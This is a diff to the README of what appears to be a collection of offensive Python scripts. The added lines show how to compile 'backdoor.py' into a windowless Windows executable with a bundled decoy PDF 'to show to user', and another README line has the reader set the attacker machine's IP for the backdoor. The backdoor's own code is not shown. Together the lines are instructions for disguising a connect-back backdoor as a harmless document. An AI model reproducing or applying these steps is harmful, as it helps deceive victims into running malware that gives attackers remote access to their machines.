@@ -5,7 +5,7 @@ A Collection of Python Scripts.
 
 ### Windows
 - Install pyinstaller for python: ```python.exe -m pip install pyinstaller```
-- Convert to exe: ```pyinstaller.exe backdoor.py --onefile --noconsole```
+- Convert to exe: ```pyinstaller.exe backdoor.py --onefile --noconsole --add-data "/root/Downloads/sample.pdf;."```
 
 ### Linux
 - Install python for Windows inside Linux: ```wine msiexec /i python-2.7.14.msi```
@@ -53,5 +53,6 @@ A Collection of Python Scripts.
 ### Backdoor
 ```python backdoor.py```
 - Set attacker machine`a IP for my_backdoor object
+- Use a sample pdf file to show to user
 
 
